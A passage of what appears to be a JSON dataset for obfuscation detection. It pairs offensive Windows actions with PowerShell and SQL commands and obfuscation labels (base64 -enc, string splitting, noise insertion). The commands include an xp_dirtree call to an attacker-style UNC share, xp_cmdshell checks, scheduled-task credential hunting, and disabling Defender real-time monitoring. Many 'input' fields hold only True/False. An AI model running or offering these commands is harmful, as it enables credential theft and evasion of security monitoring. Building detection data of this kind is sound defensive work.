    "origin_cmd": "$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }"
  },
  {
    "input": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "output": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "use the SQL Server xp_dirtree extended stored procedure to retrieve a directory listing from the network path '\\10.10.17.231\\pwn'.",
    "origin_cmd": "sqlEXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1"
  },
  {
    "input": "Enable xp_cmdshell and check it",
    "output": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "True",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "Enable xp_cmdshell and check it",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "Enable xp_cmdshell and check it",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "True",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "Enable xp_cmdshell and check it",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "Enable xp_cmdshell and check it",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "Enable xp_cmdshell and check it",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "Enable xp_cmdshell and check it",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "Enable xp_cmdshell and check it",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable xp_cmdshell and check it",
    "origin_cmd": "Get-SQLQuery -Instance \"sql.domain.io,1433\" -Query 'SELECT * FROM OPENQUERY(\"sql2.domain.io\", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'"
  },
  {
    "input": "Look for MSSQL links of an accessible instance",
    "output": "Get-SQLServerLink -Instance dcorp-mssql -Verbose",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "Look for MSSQL links of an accessible instance",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "Look for MSSQL links of an accessible instance",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "Look for MSSQL links of an accessible instance",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "Look for MSSQL links of an accessible instance",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "Look for MSSQL links of an accessible instance",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "Look for MSSQL links of an accessible instance",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "Look for MSSQL links of an accessible instance",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Look for MSSQL links of an accessible instance",
    "origin_cmd": "Get-SQLServerLink -Instance dcorp-mssql -Verbose"
  },
  {
    "input": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "output": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "True",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "True",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dumping Credentials from Scheduled Tasks, Lists scheduled tasks that are configured to run under specific user accounts, potentially revealing credentials used for task execution.",
    "origin_cmd": "Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal"
  },
  {
    "input": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "output": "Set-MpPreference -DisableRealtimeMonitoring $true",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Disabling Windows Defender, Disables Windows Defender's real-time monitoring feature, which can help in evading detection.",
    "origin_cmd": "Set-MpPreference -DisableRealtimeMonitoring $true"
  },
  {
